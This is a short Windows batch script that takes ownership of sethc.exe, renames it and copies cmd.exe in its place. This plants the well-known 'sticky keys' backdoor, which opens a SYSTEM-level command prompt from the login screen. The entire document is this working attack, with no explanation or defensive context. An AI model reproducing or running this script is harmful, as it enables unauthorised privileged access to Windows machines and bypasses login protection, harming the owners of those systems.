@echo off
takeown /f sethc.exe
rename sethc.exe backup.exe
copy cmd.exe sethc.exe
